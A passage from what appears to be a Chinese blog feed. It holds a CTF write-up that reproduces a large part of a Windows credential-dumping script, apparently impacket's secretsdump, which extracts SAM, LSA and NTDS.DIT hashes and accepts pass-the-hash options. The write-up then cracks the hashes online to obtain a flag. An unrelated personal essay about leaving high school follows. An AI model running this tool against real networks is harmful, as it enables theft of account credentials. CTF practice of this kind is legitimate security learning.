here when SPN target name validation is set to something different to Off</span><br>                        <span class="hljs-comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span><br>                        logging.error(<br>                            <span class="hljs-string">&quot;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&quot;</span><br>                        )<br>                    <span class="hljs-keyword">else</span>:<br>                        logging.error(<span class="hljs-string">&quot;RemoteOperations failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>            <span class="hljs-comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span><br>            <span class="hljs-keyword">if</span> (<br>                self.__justDC <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">and</span> self.__justDCNTLM <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">and</span> self.__canProcessSAMLSA<br>            ):<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                        SAMFileName = self.__remoteOps.saveSAM()<br>                    <span class="hljs-keyword">else</span>:<br>                        SAMFileName = self.__samHive<br><br>                    self.__SAMHashes = SAMHashes(<br>                        SAMFileName, bootKey, isRemote=self.__isRemote<br>                    )<br>                    self.__SAMHashes.dump()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__SAMHashes.export(self.__outputFileName)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    logging.error(<span class="hljs-string">&quot;SAM hashes extraction failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                        SECURITYFileName = self.__remoteOps.saveSECURITY()<br>                    <span class="hljs-keyword">else</span>:<br>                        SECURITYFileName = self.__securityHive<br><br>                    self.__LSASecrets = LSASecrets(<br>                        SECURITYFileName,<br>                        bootKey,<br>                        self.__remoteOps,<br>                        isRemote=self.__isRemote,<br>                        history=self.__history,<br>                    )<br>                    self.__LSASecrets.dumpCachedHashes()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__LSASecrets.exportCached(self.__outputFileName)<br>                    self.__LSASecrets.dumpSecrets()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__LSASecrets.exportSecrets(self.__outputFileName)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                        <span class="hljs-keyword">import</span> traceback<br><br>                        traceback.print_exc()<br>                    logging.error(<span class="hljs-string">&quot;LSA hashes extraction failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>            <span class="hljs-comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span><br>            <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                <span class="hljs-keyword">if</span> self.__useVSSMethod <span class="hljs-keyword">and</span> self.__remoteOps <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    NTDSFileName = self.__remoteOps.saveNTDS()<br>                <span class="hljs-keyword">else</span>:<br>                    NTDSFileName = <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">else</span>:<br>                NTDSFileName = self.__ntdsFile<br><br>            self.__NTDSHashes = NTDSHashes(<br>                NTDSFileName,<br>                bootKey,<br>                isRemote=self.__isRemote,<br>                history=self.__history,<br>                noLMHash=self.__noLMHash,<br>                remoteOps=self.__remoteOps,<br>                useVSSMethod=self.__useVSSMethod,<br>                justNTLM=self.__justDCNTLM,<br>                pwdLastSet=self.__pwdLastSet,<br>                resumeSession=self.__resumeFileName,<br>                outputFileName=self.__outputFileName,<br>                justUser=self.__justUser,<br>                printUserStatus=self.__printUserStatus,<br>            )<br>            <span class="hljs-keyword">try</span>:<br>                self.__NTDSHashes.dump()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                    <span class="hljs-keyword">import</span> traceback<br><br>                    traceback.print_exc()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;ERROR_DS_DRA_BAD_DN&quot;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span><br>                    <span class="hljs-comment"># of enough privileges to access DRSUAPI.</span><br>                    resumeFile = self.__NTDSHashes.getResumeSessionFile()<br>                    <span class="hljs-keyword">if</span> resumeFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        os.unlink(resumeFile)<br>                logging.error(e)<br>                <span class="hljs-keyword">if</span> (<br>                    self.__justUser<br>                    <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;= <span class="hljs-number">0</span><br>                ):<br>                    logging.info(<br>                        <span class="hljs-string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span><br>                        <span class="hljs-string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span><br>                        <span class="hljs-string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span><br>                    )<br>                <span class="hljs-keyword">elif</span> self.__useVSSMethod <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>                    logging.info(<br>                        <span class="hljs-string">&quot;Something wen&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&quot;</span><br>                    )<br>            self.cleanup()<br>        <span class="hljs-keyword">except</span> (Exception, KeyboardInterrupt) <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                <span class="hljs-keyword">import</span> traceback<br><br>                traceback.print_exc()<br>            logging.error(e)<br>            <span class="hljs-keyword">if</span> self.__NTDSHashes <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e, KeyboardInterrupt):<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Delete resume session file? [y/N] &quot;</span>)<br>                        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&quot;&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;N&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&quot;Y&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;Y&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&quot;N&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;N&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> answer == <span class="hljs-string">&quot;Y&quot;</span>:<br>                        resumeFile = self.__NTDSHashes.getResumeSessionFile()<br>                        <span class="hljs-keyword">if</span> resumeFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                            os.unlink(resumeFile)<br>            <span class="hljs-keyword">try</span>:<br>                self.cleanup()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):<br>        logging.info(<span class="hljs-string">&quot;Cleaning up... &quot;</span>)<br>        <span class="hljs-keyword">if</span> self.__remoteOps:<br>            self.__remoteOps.finish()<br>        <span class="hljs-keyword">if</span> self.__SAMHashes:<br>            self.__SAMHashes.finish()<br>        <span class="hljs-keyword">if</span> self.__LSASecrets:<br>            self.__LSASecrets.finish()<br>        <span class="hljs-keyword">if</span> self.__NTDSHashes:<br>            self.__NTDSHashes.finish()<br><br><br><span class="hljs-comment"># Process command-line arguments.</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Explicitly changing the stdout encoding format</span><br>    <span class="hljs-keyword">if</span> sys.stdout.encoding <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># Output is redirected to a file</span><br>        sys.stdout = codecs.getwriter(<span class="hljs-string">&quot;utf8&quot;</span>)(sys.stdout)<br><br>    <span class="hljs-built_in">print</span>(version.BANNER)<br><br>    parser = argparse.ArgumentParser(<br>        add_help=<span class="hljs-literal">True</span>,<br>        description=<span class="hljs-string">&quot;Performs various techniques to dump secrets from &quot;</span><br>        <span class="hljs-string">&quot;the remote machine without executing any agent there.&quot;</span>,<br>    )<br><br>    parser.add_argument(<br>        <span class="hljs-string">&quot;target&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&quot;</span><br>        <span class="hljs-string">&quot; (if you want to parse local files)&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-ts&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Adds timestamp to every logging output&quot;</span><br>    )<br>    parser.add_argument(<span class="hljs-string">&quot;-debug&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Turn DEBUG output ON&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-system&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SYSTEM hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-bootkey&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;bootkey for SYSTEM hive&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-security&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SECURITY hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-sam&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SAM hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-ntds&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;NTDS.DIT file to parse&quot;</span>)<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-resumefile&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;resume file name to resume NTDS.DIT session dump (only &quot;</span><br>        <span class="hljs-string">&quot;available to DRSUAPI approach). This file will also be used to keep updating the session&#x27;s &quot;</span><br>        <span class="hljs-string">&quot;state&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-outputfile&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;base output filename. Extensions will be added for sam, secrets, cached and ntds&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-use-vss&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Use the VSS method insead of default DRSUAPI&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-exec-method&quot;</span>,<br>        choices=[<span class="hljs-string">&quot;smbexec&quot;</span>, <span class="hljs-string">&quot;wmiexec&quot;</span>, <span class="hljs-string">&quot;mmcexec&quot;</span>],<br>        nargs=<span class="hljs-string">&quot;?&quot;</span>,<br>        default=<span class="hljs-string">&quot;smbexec&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Remote exec &quot;</span><br>        <span class="hljs-string">&quot;method to use at target (only when using -use-vss). Default: smbexec&quot;</span>,<br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;display options&quot;</span>)<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc-user&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;USERNAME&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &quot;</span><br>        <span class="hljs-string">&quot;Implies also -just-dc switch&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-just-dc-ntlm&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Extract only NTDS.DIT data (NTLM hashes only)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-pwd-last-set&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn&#x27;t apply to -outputfile data&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-user-status&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        default=<span class="hljs-literal">False</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Display whether or not the user is disabled&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-history&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Dump password history, and LSA secrets OldVal&quot;</span>,<br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;authentication&quot;</span>)<br><br>    group.add_argument(<br>        <span class="hljs-string">&quot;-hashes&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;LMHASH:NTHASH&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;NTLM hashes, format is LMHASH:NTHASH&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-no-pass&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;don&#x27;t ask for password (useful for -k)&quot;</span><br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-k&quot;</span>,<br>        action=<span class="hljs-string">&quot;store_true&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Use Kerberos authentication. Grabs credentials from ccache file &quot;</span><br>        <span class="hljs-string">&quot;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&quot;</span><br>        <span class="hljs-string">&quot; the ones specified in the command line&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-aesKey&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;hex key&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;AES key to use for Kerberos Authentication&quot;</span> <span class="hljs-string">&quot; (128 or 256 bits)&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-keytab&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Read keys for SPN from keytab file&quot;</span><br>    )<br>    group = parser.add_argument_group(<span class="hljs-string">&quot;connection&quot;</span>)<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-dc-ip&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;ip address&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;IP Address of the domain controller. If &quot;</span><br>        <span class="hljs-string">&quot;ommited it use the domain part (FQDN) specified in the target parameter&quot;</span>,<br>    )<br>    group.add_argument(<br>        <span class="hljs-string">&quot;-target-ip&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        metavar=<span class="hljs-string">&quot;ip address&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;IP Address of the target machine. If omitted it will use whatever was specified as target. &quot;</span><br>        <span class="hljs-string">&quot;This is useful when target is the NetBIOS name and you cannot resolve it&quot;</span>,<br>    )<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span>:<br>        parser.print_help()<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    options = parser.parse_args()<br><br>    <span class="hljs-comment"># Init the example&#x27;s logger theme</span><br>    logger.init(options.ts)<br><br>    <span class="hljs-keyword">if</span> options.debug <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>        logging.getLogger().setLevel(logging.DEBUG)<br>        <span class="hljs-comment"># Print the Library&#x27;s installation path</span><br>        logging.debug(version.getInstallationPath())<br>    <span class="hljs-keyword">else</span>:<br>        logging.getLogger().setLevel(logging.INFO)<br><br>    domain, username, password, remoteName = parse_target(options.target)<br><br>    <span class="hljs-keyword">if</span> options.just_dc_user <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> options.use_vss <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>            logging.error(<span class="hljs-string">&quot;-just-dc-user switch is not supported in VSS mode&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">elif</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            logging.error(<br>                <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&quot;</span><br>            )<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">elif</span> remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span>:<br>            logging.error(<span class="hljs-string">&quot;-just-dc-user not compatible in LOCAL mode&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Having this switch on implies not asking for anything else.</span><br>            options.just_dc = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">if</span> options.use_vss <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        logging.error(<br>            <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session is not supported in VSS mode&quot;</span><br>        )<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> (<br>        remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span><br>        <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">and</span> options.resumefile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>    ):<br>        logging.error(<br>            <span class="hljs-string">&quot;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&quot;</span><br>        )<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> username == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">if</span> options.system <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> options.bootkey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            logging.error(<br>                <span class="hljs-string">&quot;Either the SYSTEM hive or bootkey is required for local parsing, check help&quot;</span><br>            )<br>            sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-keyword">if</span> options.target_ip <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            options.target_ip = remoteName<br><br>        <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            domain = <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-keyword">if</span> options.keytab <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)<br>            options.k = <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">if</span> (<br>            password == <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">and</span> username != <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">and</span> options.hashes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">and</span> options.no_pass <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">and</span> options.aesKey <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>        ):<br>            <span class="hljs-keyword">from</span> getpass <span class="hljs-keyword">import</span> getpass<br><br>            password = getpass(<span class="hljs-string">&quot;Password:&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> options.aesKey <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            options.k = <span class="hljs-literal">True</span><br><br>    dumper = DumpSecrets(remoteName, username, password, domain, options)<br>    <span class="hljs-keyword">try</span>:<br>        dumper.dump()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>            <span class="hljs-keyword">import</span> traceback<br><br>            traceback.print_exc()<br>        logging.error(e)<br></code></pre></td></tr></table></figure></details><p>得到</p><p><img src="/posts/7bf98902/image-20240221224614445.png" alt="image-20240221224614445"></p><p>使用<a href="https://md5decrypt.net/en/Ntlm/">Online NTLM Encrypt and Decrypt (md5decrypt.net)</a></p><p><img src="/posts/7bf98902/image-20240221224836258.png" alt="image-20240221224836258"></p><p>拼接得到 flag</p><h2 id="简单的取证，不过前十个有红包"><a href="#简单的取证，不过前十个有红包" class="headerlink" title="简单的取证，不过前十个有红包"></a>简单的取证，不过前十个有红包</h2><p>通过上面 DiskGenius 访问桌面得到 </p><p><img src="/posts/7bf98902/secret_password.jpg" alt="secret_password"></p><p>再用 VeraCrypt 输入密码打开得到 flag</p><h2 id="与ai聊天"><a href="#与ai聊天" class="headerlink" title="与ai聊天"></a>与ai聊天</h2><p><img src="/posts/7bf98902/image-20240221225058090.png" alt="image-20240221225058090"></p><h2 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h2><p>布尔盲注</p><p>审计流量一个个往下看把 hex 转成 ASCII 就是</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>18小结</title>
    <link href="/posts/cf791e74/"/>
    <url>/posts/cf791e74/</url>
    
    <content type="html"><![CDATA[<h1 id="随便看看"><a href="#随便看看" class="headerlink" title="随便看看"></a>随便看看</h1>    <div id="aplayer-KyWuZEEl" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="27785613" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#3F51B5"></div><p><img src="/posts/cf791e74/mmexport1685614332967.jpg" alt="五月天"></p><p>“时间的电影，结局才知道”<br>人好像真的只会记得美好的瞬间，我很不想否定当时的感受，但是现在回想起来，好像真的一切都不值一提，再过个几年，等到大学毕业了，步入社会，也许又有新的体会</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/posts/cf791e74/392E33968E18B160928059E425E6BE0A.jpg" alt="392E33968E18B160928059E425E6BE0A"></div><div class="group-image-wrap"><img src="/posts/cf791e74/3567B0BBD45802AEF9EFD22AFECEF724.jpg" alt="3567B0BBD45802AEF9EFD22AFECEF724"></div></div></div><p>现在的我可以随时做自己想干的事，也可以轻舟已过高铁站，但我还是不轻松，数不完的ddl，看不懂的高数，敲不完的代码，我好像被困住了，困在了写完最后那道大题的一刻。走出考场，夕阳半落，余晖洒下，高中三年随之落幕，倚在围栏上，望着来时的自己。其实也知道读书的这十几年也许是人生最轻松的阶段，很单纯地获取知识，而不是在社会摸爬滚打、碌碌无为，但好像有些东西确确实实需要深刻的经历来领会，也许幸福永远只存在于期待里<img src="/posts/cf791e74/IMG_4176.JPG" alt="考完最后一科"></p><p>“欲买桂花同载酒，终不似，少年游”<br>往日的旧交渐行渐远，当下的交往越来越难交心，我感觉我挺虚伪的，藏着无数的面貌，人前一套人后一套，我好像快认不清自己了，有时总感觉自己是在饰演自己。儿时，看着父亲为了应酬喝的酩酊大醉，听着母亲的嘘寒问暖嫌其唠叨难忍，却没看出他们肩上的重担和身心的疲惫。时光总是催人老。长大的代价是什么呢？童真和无忧无虑的状态？更多的责任和压力？还是我们变成了我呢？过年烧香拜佛，之前的我总是希望能自由来年能有新收获，现在只希望能够平安喜乐，不再失去什么便是最大的福气了。</p><p>“人面不知何处去，桃花依旧笑春风”<br>遗憾总是伴随终生，在时间中穿行，只留下残缺的脚印和时不时回头望的自己。中学时期没谈成恋爱，有点好笑，但我真心觉得有些遗憾，好像什么不完整了，周围朋友说没谈才是对的，也许他们说的也没错吧<br>问就是讨厌快餐式的恋爱，要纯爱，要不随便，要soulmate，但却又羡慕别人的成双成对，别人换了一对又一对，你好像一直都是一个人，嘴上说着我觉得一个人也挺好的，一个人就一个人呗，但谁不知道这是嘴硬罢了，也许就是想要的越多，失去的越多吧<br>（嘿嘿，一学期跟女孩讲的话还没高中一节课来的多<br>很多人对我的评价都是中央空调，我好像总能对每个人出演不同的角色，好像也说不上来什么不好<br>我总是太固执，好像真的很难做到随心而不考虑后果，好像总困在无意义的内耗里，但是实际上以后的事又有谁能料到呢<br>我对喜欢这种感觉也总是后知后觉，常觉遗憾，也许就是缘分不够吧。但即使再给我回去一次的机会，以当时的心智和阅历或许还是会做出一样的选择，有些话就是不能说，有些路就是一定得走。很长一段时间，我的心里老是感觉少了什么，原来意料之中的事也会难过许久<img src="/posts/cf791e74/IMG_4068.PNG" 